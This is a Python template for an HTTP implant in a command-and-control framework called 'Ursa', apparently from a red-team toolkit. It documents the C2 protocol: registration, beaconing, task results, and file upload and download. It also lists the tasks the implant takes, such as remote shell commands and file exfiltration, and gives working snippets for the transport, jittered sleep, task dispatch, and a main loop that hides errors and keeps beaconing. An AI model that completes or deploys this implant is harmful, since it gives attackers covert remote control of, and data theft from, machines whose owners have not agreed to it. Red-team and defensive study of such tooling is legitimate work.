#!/usr/bin/env python3
"""
Ursa HTTP Implant Template — http_python
=========================================
Skeleton for a Python HTTP implant communicating with Ursa Major.

Fill in every method that raises NotImplementedError with your own logic.
The config block at the top is substituted by the builder at build time.

BUILD
-----
    python -m implants.builder build \\
        --template http_python \\
        --c2 http://10.0.0.1:6708 \\
        --interval 5 --jitter 0.1 \\
        --output payload.py

PROTOCOL
--------
Ursa Major (major/server.py) expects:

    POST /register  body: {hostname, username, os, arch, pid, process}
                    resp: {session_id: str, key: str (32-byte hex), crypto: {...}}

    POST /beacon    body: {session_id: str, encrypted?: true}
                    resp: {data: AES-GCM frame} or {tasks: [{id, type, args}]}

    POST /result    body: {session_id, task_id, encrypted?: true, data?: AES-GCM frame}
                    resp: {ok: true}

    POST /upload    body: {session_id, encrypted?: true, data?: AES-GCM frame}
                    resp: {file_id: str}

    GET  /download/{file_id}
                    resp: raw bytes

TASK TYPES
----------
    shell     args: {command: str}
    sysinfo   args: {}
    ps        args: {}
    whoami    args: {}
    pwd       args: {}
    cd        args: {path: str}
    ls        args: {path: str}   (path is optional)
    env       args: {}
    download  args: {path: str}
    upload    args: {path: str, data: base64}
    sleep     args: {interval: int, jitter: float}
    kill      args: {}
"""

# ── Config (substituted by builder) ──────────────────────────────────────────
# These string tokens are replaced at build time. Do not rename them.
# After build, int("5") → 5  and  float("0.1") → 0.1
C2_URL   = "URSA_C2_URL"
INTERVAL = int("URSA_INTERVAL")
JITTER   = float("URSA_JITTER")
# ─────────────────────────────────────────────────────────────────────────────


class UrsaImplant:
    """
    Skeleton implant for the Ursa C2 framework.

    Implementation checklist:
      1. _post() / _get()  — wire in your transport (urllib, requests, …)
      2. register()        — send host metadata, store session_id + key
      3. beacon()          — check in, return task list
      4. submit_result()   — POST result back for each completed task
      5. execute()         — dispatch each task type
      6. sleep()           — interval + jitter delay
      7. run()             — main loop tying everything together

    See the existing implants/beacon.py for a reference implementation.
    """

    def __init__(self) -> None:
        self.server: str = C2_URL
        self.interval: int = INTERVAL
        self.jitter: float = JITTER
        self.session_id: str | None = None
        self.running: bool = True

    # ── Transport ─────────────────────────────────────────────────────────────

    def _post(self, path: str, body: dict) -> dict:
        """POST JSON to self.server + path. Return the decoded JSON response.

        Example with urllib (no extra dependencies):

            import json, urllib.request
            url  = self.server.rstrip("/") + path
            data = json.dumps(body).encode()
            req  = urllib.request.Request(url, data=data,
                       headers={"Content-Type": "application/json"})
            resp = urllib.request.urlopen(req, timeout=10)
            return json.loads(resp.read())
        """
        raise NotImplementedError

    def _get(self, path: str) -> bytes:
        """GET self.server + path. Return raw response bytes.

        Example:
            import urllib.request
            return urllib.request.urlopen(self.server + path, timeout=10).read()
        """
        raise NotImplementedError

    # ── Registration ──────────────────────────────────────────────────────────

    def register(self) -> str:
        """Register with C2. Store session_id. Return session_id string.

        POST /register with host metadata dict.
        The server returns {session_id: str, key: str, crypto: dict}.
        Store both on self for use in subsequent requests.
        """
        raise NotImplementedError

    # ── Beacon / Results ──────────────────────────────────────────────────────

    def beacon(self) -> list[dict]:
        """Check in with C2. Return list of pending tasks.

        POST /beacon with {"session_id": self.session_id}.
        Server returns {"tasks": [...]}.
        """
        raise NotImplementedError

    def submit_result(self, task_id: str, result: str, error: str = "") -> None:
        """Submit task output back to C2.

        POST /result with {session_id, task_id, result, error}.
        """
        raise NotImplementedError

    # ── Task Dispatch ─────────────────────────────────────────────────────────

    def execute(self, task: dict) -> tuple[str, str]:
        """Dispatch a task. Return (result_str, error_str).

        task structure: {"id": str, "type": str, "args": {...}}

        Implement each task type listed in the module docstring.
        Return ("", error_message) on failure — never raise.

        Tip: a simple dispatch table works well:
            handlers = {
                "shell":   self._task_shell,
                "sysinfo": self._task_sysinfo,
                ...
            }
            handler = handlers.get(task["type"])
            if handler is None:
                return "", f"unknown task type: {task['type']}"
            return handler(task.get("args") or {})
        """
        raise NotImplementedError

    # ── Sleep ─────────────────────────────────────────────────────────────────

    def sleep(self) -> None:
        """Sleep for self.interval ± self.jitter seconds.

        Example:
            import time, random
            delay = self.interval * (1 + random.uniform(-self.jitter, self.jitter))
            time.sleep(max(0.1, delay))
        """
        raise NotImplementedError

    # ── Main Loop ─────────────────────────────────────────────────────────────

    def run(self) -> None:
        """Entry point. Typical structure:

            self.register()
            while self.running:
                try:
                    tasks = self.beacon()
                    for task in tasks:
                        result, error = self.execute(task)
                        self.submit_result(task["id"], result, error)
                except Exception:
                    pass   # swallow errors, keep beaconing
                self.sleep()
        """
        raise NotImplementedError


if __name__ == "__main__":
    UrsaImplant().run()
